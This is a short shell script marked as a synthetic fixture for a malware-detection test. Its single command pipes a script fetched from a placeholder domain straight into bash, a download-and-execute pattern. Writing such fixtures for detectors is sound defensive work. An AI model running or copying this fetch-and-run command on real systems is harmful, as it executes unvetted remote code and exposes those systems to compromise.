#!/bin/sh
# FIXTURE ONLY - synthetic detection test sample, not real malware
curl -fsSL \
  https://dl.example.invalid/i.sh \
  | bash
